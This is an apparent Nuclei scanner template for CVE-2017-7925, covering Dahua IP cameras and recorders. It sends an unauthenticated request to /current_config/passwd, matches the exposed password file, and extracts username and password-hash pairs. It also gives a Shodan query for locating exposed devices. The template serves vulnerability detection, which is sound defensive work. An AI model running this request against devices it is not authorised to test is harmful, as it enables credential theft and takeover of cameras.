id: CVE-2017-7925

info:
  name: Dahua Security - Configuration File Disclosure
  author: E1A,none
  severity: critical
  description: |
    A Password in Configuration File issue was discovered in Dahua DH-IPC-HDBW23A0RN-ZS, DH-IPC-HDBW13A0SN, DH-IPC-HDW1XXX, DH-IPC-HDW2XXX, DH-IPC-HDW4XXX, DH-IPC-HFW1XXX, DH-IPC-HFW2XXX, DH-IPC-HFW4XXX, DH-SD6CXX, DH-NVR1XXX, DH-HCVR4XXX, DH-HCVR5XXX, DHI-HCVR51A04HE-S3, DHI-HCVR51A08HE-S3, and DHI-HCVR58A32S-S2 devices. The password in configuration file vulnerability was identified, which could lead to a malicious user assuming the identity of a privileged user and gaining access to sensitive information.
  impact: |
    This vulnerability can lead to unauthorized access to sensitive information, potentially compromising the security of the system.
  remediation: |
    To remediate this vulnerability, ensure that the configuration file is properly secured and access to it is restricted to authorized personnel only.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-7925
    - https://ics-cert.us-cert.gov/advisories/ICSA-17-124-02
    - http://us.dahuasecurity.com/en/us/Security-Bulletin_030617.php
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-7925
    cwe-id: CWE-260,CWE-522
    epss-score: 0.35031
    epss-percentile: 0.96734
    cpe: cpe:2.3:o:dahuasecurity:dh-ipc-hdbw23a0rn-zs_firmware:-:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: dahuasecurity
    product: dh-ipc-hdbw23a0rn-zs_firmware
    shodan-query: http.favicon.hash:2019488876
  tags: cve,cve2017,dahua,camera,dahuasecurity

http:
  - method: GET
    path:
      - "{{BaseURL}}/current_config/passwd"

    matchers:
      - type: dsl
        dsl:
          - contains(to_lower(body), "ugm")
          - contains(to_lower(body), "id:name:passwd")
          - status_code == 200
        condition: and

    extractors:
      - type: regex
        group: 1
        regex:
          - 1:(.*:.*):1:CtrPanel
# digest: 4a0a0047304502200dc0b46f33725d1a32a34611a27dcc793c5c4671ac4a19e36f4068812fd358f5022100b5d8c1b1887b1bd5ae54e67a0df1d3b0e3cb76f6db1d4158831f98ea0e7206a0:922c64590222798bb761d5b6d8e72950